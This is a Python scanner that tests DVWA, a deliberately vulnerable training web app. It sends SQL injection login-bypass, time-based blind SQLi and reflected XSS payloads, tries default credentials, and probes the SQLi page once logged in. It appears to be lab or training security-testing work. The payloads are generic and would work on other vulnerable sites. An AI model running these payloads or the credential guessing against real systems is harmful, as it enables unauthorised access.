#!/usr/bin/env python3
"""
DVWA-Specific Vulnerability Scanner
Find REAL vulnerabilities in Damn Vulnerable Web Application
"""

import asyncio
import aiohttp
import logging
import time
import re
from typing import List, Dict, Optional
from datetime import datetime

class DVWAScanner:
    """Scanner specifically designed for DVWA vulnerabilities"""
    
    def __init__(self, asset_manager):
        self.asset_manager = asset_manager
        self.logger = logging.getLogger(__name__)
        
        # Common DVWA endpoints we know exist
        self.dvwa_endpoints = [
            '/dvwa/login.php',
            '/dvwa/index.php', 
            '/dvwa/vulnerabilities/sqli/',
            '/dvwa/vulnerabilities/xss_r/',
            '/dvwa/vulnerabilities/xss_s/',
            '/dvwa/vulnerabilities/csrf/',
            '/dvwa/vulnerabilities/fi/',
            '/dvwa/vulnerabilities/brute/',
            '/dvwa/vulnerabilities/upload/',
            '/dvwa/vulnerabilities/captcha/',
            '/dvwa/vulnerabilities/exec/',
            '/dvwa/setup.php'
        ]
        
    async def scan_dvwa_target(self, base_url: str) -> List[Dict]:
        """Scan DVWA for real vulnerabilities"""
        
        vulnerabilities = []
        
        if 'dvwa' not in base_url.lower():
            self.logger.info(f"Skipping non-DVWA target: {base_url}")
            return vulnerabilities
            
        self.logger.info(f"🎯 DVWA SCAN: Starting comprehensive scan of {base_url}")
        
        async with aiohttp.ClientSession() as session:
            # Test login bypass (should work on DVWA)
            login_vulns = await self._test_login_bypass(base_url, session)
            vulnerabilities.extend(login_vulns)
            
            # Test for SQL injection on login
            sqli_vulns = await self._test_login_sqli(base_url, session)
            vulnerabilities.extend(sqli_vulns)
            
            # Test XSS on login form
            xss_vulns = await self._test_login_xss(base_url, session)
            vulnerabilities.extend(xss_vulns)
            
            # Try to get session and test authenticated endpoints
            session_cookie = await self._attempt_login(base_url, session)
            if session_cookie:
                auth_vulns = await self._test_authenticated_endpoints(base_url, session, session_cookie)
                vulnerabilities.extend(auth_vulns)
        
        self.logger.info(f"✅ DVWA SCAN COMPLETE: Found {len(vulnerabilities)} real vulnerabilities")
        return vulnerabilities
    
    async def _test_login_bypass(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Test for login bypass vulnerabilities"""
        
        vulnerabilities = []
        login_url = f"{base_url}/login.php" if not base_url.endswith('/login.php') else base_url
        
        # Common SQL injection payloads for login bypass
        bypass_payloads = [
            {'username': "admin' OR '1'='1' -- ", 'password': 'anything'},
            {'username': "admin' OR '1'='1' /*", 'password': 'anything'},
            {'username': "' OR 1=1 -- ", 'password': 'anything'},
            {'username': "admin", 'password': "' OR '1'='1' -- "},
            {'username': "admin' -- ", 'password': 'anything'}
        ]
        
        for payload in bypass_payloads:
            try:
                # Test login bypass
                data = {
                    'username': payload['username'],
                    'password': payload['password'],
                    'Login': 'Login'
                }
                
                async with session.post(login_url, data=data) as response:
                    response_text = await response.text()
                    
                    # Check for successful bypass indicators
                    success_indicators = [
                        'welcome',
                        'logout',
                        'vulnerabilities',
                        'home.php',
                        'index.php',
                        'dashboard'
                    ]
                    
                    # Check for failure indicators
                    failure_indicators = [
                        'login failed',
                        'incorrect',
                        'invalid',
                        'username and/or password incorrect'
                    ]
                    
                    has_success = any(indicator in response_text.lower() for indicator in success_indicators)
                    has_failure = any(indicator in response_text.lower() for indicator in failure_indicators)
                    
                    if has_success and not has_failure:
                        vulnerabilities.append({
                            'type': 'sql-injection-auth-bypass',
                            'description': f'[DVWA-REAL] SQL Injection Authentication Bypass',
                            'severity': 'CRITICAL',
                            'confidence': 0.95,
                            'evidence': f'Login bypass successful with payload: {payload["username"]}',
                            'payload': f'username={payload["username"]}&password={payload["password"]}',
                            'asset_url': login_url,
                            'detected_at': datetime.now().isoformat()
                        })
                        
                        self.logger.info(f"✅ LOGIN BYPASS CONFIRMED: {payload['username']}")
                        break  # Found working bypass, no need to test more
                        
            except Exception as e:
                self.logger.error(f"Login bypass test failed: {e}")
                
        return vulnerabilities
    
    async def _test_login_sqli(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Test for timing-based SQL injection on login"""
        
        vulnerabilities = []
        login_url = f"{base_url}/login.php" if not base_url.endswith('/login.php') else base_url
        
        # Time-based SQL injection payloads
        timing_payloads = [
            "admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5) -- ",
            "admin'; WAITFOR DELAY '00:00:05' -- ",
            "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
        ]
        
        for payload in timing_payloads:
            try:
                # Test normal request timing
                start_time = time.time()
                data = {'username': 'admin', 'password': 'admin', 'Login': 'Login'}
                async with session.post(login_url, data=data) as response:
                    await response.text()
                normal_time = time.time() - start_time
                
                # Test with SQL injection payload
                start_time = time.time()
                data = {'username': payload, 'password': 'anything', 'Login': 'Login'}
                async with session.post(login_url, data=data) as response:
                    await response.text()
                injection_time = time.time() - start_time
                
                time_diff = injection_time - normal_time
                
                self.logger.info(f"📊 SQL Timing Test: Normal={normal_time:.2f}s, Injection={injection_time:.2f}s, Diff={time_diff:.2f}s")
                
                # If injection takes significantly longer, it's likely SQL injection
                if time_diff >= 4.0:  # Should be ~5 second delay
                    vulnerabilities.append({
                        'type': 'sql-injection-blind',
                        'description': f'[DVWA-REAL] Time-based Blind SQL Injection on Login',
                        'severity': 'HIGH',
                        'confidence': 0.90,
                        'evidence': f'Time delay of {time_diff:.2f}s indicates SQL injection',
                        'payload': payload,
                        'asset_url': login_url,
                        'detected_at': datetime.now().isoformat()
                    })
                    
                    self.logger.info(f"✅ BLIND SQLi CONFIRMED: {time_diff:.2f}s delay")
                    break
                    
            except Exception as e:
                self.logger.error(f"SQL injection timing test failed: {e}")
                
        return vulnerabilities
    
    async def _test_login_xss(self, base_url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Test for XSS vulnerabilities on login form"""
        
        vulnerabilities = []
        login_url = f"{base_url}/login.php" if not base_url.endswith('/login.php') else base_url
        
        # XSS payloads to test
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>'
        ]
        
        for payload in xss_payloads:
            try:
                data = {
                    'username': payload,
                    'password': payload,
                    'Login': 'Login'
                }
                
                async with session.post(login_url, data=data) as response:
                    response_text = await response.text()
                    
                    # Check if payload is reflected without proper encoding
                    if payload in response_text and '<script>' in response_text:
                        vulnerabilities.append({
                            'type': 'xss-reflected',
                            'description': f'[DVWA-REAL] Reflected XSS on Login Form',
                            'severity': 'HIGH',
                            'confidence': 0.85,
                            'evidence': f'XSS payload reflected without encoding: {payload}',
                            'payload': payload,
                            'asset_url': login_url,
                            'detected_at': datetime.now().isoformat()
                        })
                        
                        self.logger.info(f"✅ XSS CONFIRMED: Payload reflected")
                        break
                        
            except Exception as e:
                self.logger.error(f"XSS test failed: {e}")
                
        return vulnerabilities
    
    async def _attempt_login(self, base_url: str, session: aiohttp.ClientSession) -> Optional[str]:
        """Try to login with default credentials"""
        
        login_url = f"{base_url}/login.php" if not base_url.endswith('/login.php') else base_url
        
        # Common DVWA default credentials
        credentials = [
            {'username': 'admin', 'password': 'password'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'user', 'password': 'user'},
            {'username': 'test', 'password': 'test'}
        ]
        
        for cred in credentials:
            try:
                data = {
                    'username': cred['username'],
                    'password': cred['password'],
                    'Login': 'Login'
                }
                
                async with session.post(login_url, data=data) as response:
                    response_text = await response.text()
                    
                    if 'welcome' in response_text.lower() or 'logout' in response_text.lower():
                        # Extract session cookie
                        cookies = response.cookies
                        if cookies:
                            self.logger.info(f"✅ LOGIN SUCCESS: {cred['username']}:{cred['password']}")
                            return str(cookies)
                            
            except Exception as e:
                self.logger.error(f"Login attempt failed: {e}")
                
        return None
    
    async def _test_authenticated_endpoints(self, base_url: str, session: aiohttp.ClientSession, cookies: str) -> List[Dict]:
        """Test vulnerability endpoints that require authentication"""
        
        vulnerabilities = []
        
        # Set cookies for authenticated requests
        session.cookie_jar.update_cookies({'PHPSESSID': cookies.split('PHPSESSID=')[1].split(';')[0] if 'PHPSESSID=' in cookies else ''})
        
        # Test SQL injection vulnerability page
        sqli_url = f"{base_url.rstrip('/dvwa/login.php')}/dvwa/vulnerabilities/sqli/"
        try:
            # Test basic SQL injection
            params = {'id': "1' OR '1'='1", 'Submit': 'Submit'}
            async with session.get(sqli_url, params=params) as response:
                response_text = await response.text()
                
                if 'surname' in response_text.lower() and 'first name' in response_text.lower():
                    vulnerabilities.append({
                        'type': 'sql-injection',
                        'description': f'[DVWA-REAL] SQL Injection on Vulnerability Page',
                        'severity': 'CRITICAL',
                        'confidence': 0.95,
                        'evidence': f'SQL injection returns database records',
                        'payload': "id=1' OR '1'='1",
                        'asset_url': sqli_url,
                        'detected_at': datetime.now().isoformat()
                    })
                    
                    self.logger.info(f"✅ AUTHENTICATED SQLi CONFIRMED")
                    
        except Exception as e:
            self.logger.error(f"Authenticated SQL injection test failed: {e}")
            
        return vulnerabilities